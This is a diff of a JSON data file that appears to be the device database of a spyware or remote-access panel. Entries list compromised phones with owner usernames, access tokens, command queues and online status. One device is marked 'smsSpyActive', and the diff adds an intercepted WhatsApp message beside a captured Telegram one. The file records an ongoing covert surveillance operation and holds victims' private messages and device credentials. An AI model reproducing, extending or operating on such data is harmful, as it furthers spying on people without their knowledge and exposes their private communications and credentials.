@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777350390707,
+    "lastSeen": 1777350411775,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -458,7 +458,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777350389445,
+    "lastSeen": 1777350413457,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -4491,7 +4491,7 @@
     "deviceName": "HP-KONTOL-A754",
     "ownerUsername": "Ubill_raa",
     "token": "bfb9af2cf50b25656e3283905dce6368",
-    "lastSeen": 1777350391386,
+    "lastSeen": 1777350412330,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T04:01:30.004Z",
@@ -4507,6 +4507,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Jar",
+        "content": "① Foto",
+        "time": "28/04 11:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777350413547
+      },
       {
         "appName": "Telegram",
         "sender": "𝗦𝙊𝙇𝘿𝙄𝙀𝙍 𝗕𝙊𝙔 (𝟮𝟬𝟭𝟵) ™",
